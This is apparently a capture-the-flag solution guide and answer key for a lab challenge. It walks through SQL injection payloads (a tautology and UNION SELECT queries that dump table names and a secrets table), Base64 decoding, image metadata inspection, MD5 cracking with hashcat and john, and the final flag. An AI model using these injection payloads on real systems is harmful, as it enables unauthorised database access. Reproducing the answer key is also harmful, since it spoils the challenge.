# CTF Challenge - Level 8: SQL Injection + Steganography

## Challenge Overview
This is a multi-stage CTF challenge involving SQL injection, code analysis, steganography, and hash cracking.

**Final Flag**: `flag{Url/inspect.png}`

## Challenge Flow

### Phase 1: SQL Injection
**Objective**: Exploit the vulnerable login form to extract database information.

#### Step 1: Access the Challenge
1. Navigate to `http://localhost:3000` (or your deployed URL)
2. You'll see the login page with a cyberpunk-themed interface

#### Step 2: Identify the Vulnerability
- The login form is vulnerable to SQL injection
- Username and password fields are not sanitized
- The SQL query is: `SELECT id, username, role FROM users WHERE username = '${username}' AND password = '${password}'`

#### Step 2.5: Find Hidden Payload
**Method 1: Page Source Analysis**
1. Right-click → View Page Source
2. Look for obfuscated JavaScript code
3. Find the Base64 encoded payload: `JyBPUiAnMQ==`
4. Decode it: `' OR '1`

**Method 2: Browser Console**
1. Press F12 → Console tab
2. Type: `atob('JyBPUiAnMQ==')`
3. Result: `' OR '1`

**Method 3: CSS Variables**
1. Inspect CSS file (`style.css`)
2. Look for: `--auth-payload: "JyBPUiAnMQ=="`
3. Decode the Base64 string

#### Step 3: Exploit SQL Injection
Try these payloads in the username field:

**Hidden Payload (Found in Page Source):**
```
' OR '1
```

**Basic Union Injection:**
```
admin' UNION SELECT 1,2,3--
```

**Extract Database Schema:**
```
admin' UNION SELECT sqlite_version(),2,3--
```

**Extract Table Names:**
```
admin' UNION SELECT name,2,3 FROM sqlite_master WHERE type='table'--
```

**Extract Secrets Table Data:**
```
admin' UNION SELECT note,owner,3 FROM secrets--
```

**Expected Result**: You should get the secret `/inspect.png` from the secrets table.

### Phase 2: Code Analysis
**Objective**: Find hidden hash fragments in the dashboard code.

#### Step 1: Access Dashboard
1. After successful login, you'll be redirected to the dashboard
2. The dashboard contains forensic analysis tools

#### Step 2: Analyze Source Code
**HTML Analysis:**
1. Right-click → View Page Source
2. Look for comments containing hash fragments:
   ```html
   <!-- System hash fragments: 1751721a4245734b1ff733b4a7ebe952 -->
   <!-- Cache optimization: 1751721a -->
   <!-- Debug flags: 4245734b -->
   <!-- Performance data: 1ff733b4 -->
   <!-- Memory allocation: a7ebe952 -->
   ```

3. **Piece together the MD5 hash**: `1751721a4245734b1ff733b4a7ebe952`

**CSS Analysis:**
1. Inspect the CSS file (`style.css`)
2. Look for Base64 fragments:
   ```css
   --data-fragment-1: "VXJsL2lu";
   --data-fragment-2: "c3BlY3QucG5nCg==";
   ```

3. **Piece together the Base64**: `VXJsL2luc3BlY3QucG5nCg==`

**JavaScript Analysis:**
1. Inspect the JavaScript file (`app.js`)
2. Look for Base64 fragments:
   ```javascript
   const _base64Fragment1 = 'VXJsL2lu';
   const _base64Fragment2 = 'c3BlY3QucG5nCg==';
   ```

3. **Decode the Base64**:
   ```bash
   echo "VXJsL2luc3BlY3QucG5nCg==" | base64 -d
   # Output: Url/inspect.png
   ```

### Phase 3: Steganography Analysis
**Objective**: Extract hidden data from the steganography image.

#### Step 1: Download the Image
1. From the SQL injection results, you know the image path is `/assets/inspect.png`
2. Download the image from `http://localhost:3000/assets/inspect.png`

#### Step 2: Analyze the Image
**Method 1: Using exiftool**
```bash
exiftool inspect.png
```

**Method 2: Using strings command**
```bash
strings inspect.png
```

**Method 3: Using binwalk**
```bash
binwalk inspect.png
```

**Expected Result**: You should find the MD5 hash `1751721a4245734b1ff733b4a7ebe952` embedded in the image's metadata.

### Phase 4: Hash Cracking
**Objective**: Crack the MD5 hash to reveal the final flag.

#### Step 1: Identify the Hash
- MD5 hash from code analysis: `1751721a4245734b1ff733b4a7ebe952`
- This hash should also be found in the steganography image

#### Step 2: Crack the Hash
**Online Tools:**
- [CrackStation](https://crackstation.net/)
- [MD5 Decrypt](https://md5decrypt.net/)
- [HashKiller](https://hashkiller.io/)

**Command Line Tools:**
```bash
# Using hashcat
hashcat -m 0 -a 3 1751721a4245734b1ff733b4a7ebe952 ?a?a?a?a?a?a?a?a

# Using john the ripper
echo "1751721a4245734b1ff733b4a7ebe952" > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Expected Result**: The hash should decode to `Url/inspect.png`

### Phase 5: Flag Submission
**Objective**: Submit the final flag.

#### Step 1: Construct the Flag
Based on the decoded hash result, the flag format is:
```
flag{Url/inspect.png}
```

#### Step 2: Submit the Flag
1. Go to the dashboard
2. Use the flag submission interface (if available)
3. Or submit via API endpoint:
   ```bash
   curl -X POST http://localhost:3000/submit \
        -H "Content-Type: application/json" \
        -d '{"flag": "flag{Url/inspect.png}"}'
   ```

## Alternative Solution Paths

### Path 1: Direct Code Analysis
If you skip SQL injection and go straight to code analysis:
1. Access the dashboard directly
2. Analyze HTML, CSS, and JavaScript for hidden fragments
3. Piece together the MD5 hash and Base64 data
4. Crack the MD5 hash
5. Submit the flag

### Path 2: Steganography First
If you discover the image path through other means:
1. Download and analyze the steganography image
2. Extract the MD5 hash from the image
3. Cross-reference with code fragments for verification
4. Crack the hash
5. Submit the flag

## Tools and Resources

### Required Tools
- Web browser with developer tools
- Base64 decoder
- MD5 hash cracker
- Steganography analysis tools (exiftool, strings, binwalk)

### Online Resources
- [Base64 Decoder](https://www.base64decode.org/)
- [MD5 Hash Cracker](https://crackstation.net/)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## Hints

### Level 1 Hint
Try using UNION SELECT to extract data from other tables.

### Level 2 Hint
Look for hidden data in HTML comments and CSS/JavaScript variables.

### Level 3 Hint
The image contains embedded text data in its metadata.

### Level 4 Hint
The MD5 hash decodes to a file path that matches the flag format.

## Common Pitfalls

1. **SQL Injection Syntax**: Make sure to use proper SQL injection syntax with quotes and comments
2. **Hash Fragments**: Don't miss any fragments when piecing together the complete hash
3. **Base64 Decoding**: Ensure you're decoding the complete Base64 string, not just fragments
4. **Steganography Tools**: Try multiple tools as some may not detect all embedded data
5. **Hash Cracking**: The hash might be a common word or phrase, try online databases first

## Success Criteria

✅ Successfully exploit SQL injection to extract `/assets/inspect.png`  
✅ Find MD5 hash fragments in HTML code: `1751721a4245734b1ff733b4a7ebe952`  
✅ Find Base64 fragments in CSS/JS code: `VXJsL2luc3BlY3QucG5nCg==`  
✅ Decode Base64 to get: `Url/inspect.png`  
✅ Extract MD5 hash from steganography image  
✅ Crack MD5 hash to reveal: `Url/inspect.png`  
✅ Submit final flag: `flag{Url/inspect.png}`  

## Flag
**`flag{Url/inspect.png}`**
